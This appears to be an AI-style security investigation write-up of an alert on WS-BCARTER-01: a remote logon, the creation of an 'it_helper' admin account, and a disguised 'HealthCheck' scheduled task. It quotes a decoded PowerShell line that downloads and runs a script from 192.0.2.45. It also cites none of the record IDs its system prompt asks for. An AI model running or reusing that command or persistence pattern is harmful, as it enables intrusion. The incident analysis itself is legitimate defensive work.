system: You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.

supporting_observations.claim: A remote interactive logon for omar.haddad reached WS-BCARTER-01 from 192.0.2.45. The observed source and destination conflict with the stated practice that remote administration is only performed from WS-OHADDAD-01.
The domain controller recorded creation of it_helper at 13:44:18 UTC by omar.haddad, later than the alert's approximate 13:42 time.
About two seconds after creation, it_helper was added to the Administrators group by omar.haddad.

A task named Microsoft\Windows\HealthCheck was registered on WS-BCARTER-01 under omar.haddad's session. Its PowerShell action uses a hidden window and an encoded command that decodes to `IEX (iwr http://192.0.2.45/a.ps1)`.

The combination of an unexpected remote interactive session, creation of an account followed by Administrators-group membership, and a task configured to retrieve and execute a script from the same address supports a malicious-activity finding.

known_telemetry_limitations: Proxy logs were not collected from 13:30 to 14:10 UTC because of a collection outage; this overlaps the account creation and task-registration activity.
The available records show task registration and its configured action, but do not establish that the task ran or that the referenced script was retrieved or executed.
claims_not_established: The identity of the person controlling 192.0.2.45, or whether omar.haddad's credentials or session were compromised.
Whether the task executed and what the referenced script contained or did.
Whether it_helper was used after creation, or what access or actions it had beyond the recorded Administrators-group membership.
Whether any data was accessed, altered, or exfiltrated.
additional_evidence_needed: Preserve and review WS-BCARTER-01 and DC-HD-01 authentication, process, task-scheduler, and account-management logs around the event; correlate the domain-controller logon that performed the account and group changes.
Identify and validate the source and ownership of 192.0.2.45, and investigate how it reached WS-BCARTER-01.
Recover proxy logs or equivalent network records for 13:30–14:10 UTC to determine the requested destinations and any script transfer.
Retrieve the registered task's subsequent execution history and, if available, the script or related artifacts from the endpoint.
Confirm the status and use of it_helper, including whether it remains enabled or has authenticated since creation.
